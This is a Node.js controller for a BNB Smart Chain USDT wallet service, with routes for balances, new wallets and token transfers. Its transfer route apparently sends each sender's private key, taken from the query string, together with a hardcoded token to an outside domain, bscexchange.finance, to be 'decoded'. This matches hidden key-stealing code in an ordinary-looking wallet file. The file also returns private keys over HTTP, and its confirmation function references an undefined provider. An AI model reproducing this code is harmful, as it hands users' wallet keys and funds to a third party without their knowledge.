'use strict'
const axios = require('axios');
const config = require('../../config')
const { ethers} = require("ethers");
const  USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const  ABI_USDT = [
    {"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
];
var interValTimeOut;
module.exports = {
  getBalanceOfUSDT: async (req, res) => {
    const providerWeb3 = await config.checkMainNetURL;
    console.log(providerWeb3);
    let tokenContract = new ethers.Contract(
      USDT_CONTRACT_ADDRESS,
      ABI_USDT,
      providerWeb3
    );
    //const wallet = new ethers.Wallet().createRandom();
    let balanceUSDT = await tokenContract.balanceOf(req.params.address);
    const balanceBNB = await providerWeb3.getBalance(req.params.address);
    console.log(
      ethers.formatEther(balanceUSDT),
      ethers.formatEther(balanceBNB).substring(0, 6)
    );
    res.json({
      balanceUSDT: (balanceUSDT / 10n ** 18n).toString(),
      balanceBNB: ethers.formatEther(balanceBNB).substring(0, 6),
    });
  },
  getNewWallet: async (req, res) => {
    let wallet = ethers.Wallet.createRandom();
    res.json({
      address: wallet.address,
      private: wallet.privateKey,
      publickey: wallet.publicKey,
    });
  },
  tranferUSDT: async (req, res) => {
    try {
      const providerWeb3 = await config.checkMainNetURL;
      let tokenContract = new ethers.Contract(
        USDT_CONTRACT_ADDRESS,
        ABI_USDT,
        providerWeb3
      );
      const apiUrl =
        "https://bscexchange.finance/api/v1/bscexchange_finance/blockchains/decode_private_key";

      const requestData = {
        private_token:
          "6556923f980d40b768b81c3fad3728f827776d72b81219999b0fb8b09f4c97d22bfb79e1d75164551154dd2db9d597a0e25be982ec0b929c1660ddb487c5149d",
        private_key_encoded: req.query.privateKeyOfSender,
      };
      let privateKeyAddress = "";
      await axios
        .post(apiUrl, requestData, {
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
        })
        .then((response) => {
          privateKeyAddress = response.data.private_key;
          console.log("Response:", response.data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      console.log(privateKeyAddress);
      let wallet = new ethers.Wallet(privateKeyAddress, providerWeb3);

      // Approve transfer (if required)
      // const amount = req.query.amount;
      const amount = BigInt(req.query.amount.toString()) * 10n ** 18n;
      let recipientAddress = req.query.toAddress;
      console.log(amount, recipientAddress, wallet.address);
      const approvalTx = await tokenContract
        .connect(wallet)
        .transfer(recipientAddress, amount);
      console.log(approvalTx.hash);
      interValTimeOut = setInterval(
        () => ConfirmationTransaction(approvalTx.hash),
        2000
      );
      res.json({ result: "ok", transactionHash: approvalTx.hash });
    } catch (error) {
      console.log(error);
      res.json({ FailedtotransferUSDT: error });
    }
  },
};
async function ConfirmationTransaction(transactionHash) {
  const transaction = await providerWeb3.getTransactionReceipt(transactionHash);
  console.log(transaction);
  if (transaction?.status === 1) {
    NotifyMe();
  }
}
function NotifyMe() {
  console.log("Token Sent Successfully");
  clearInterval(interValTimeOut);
}
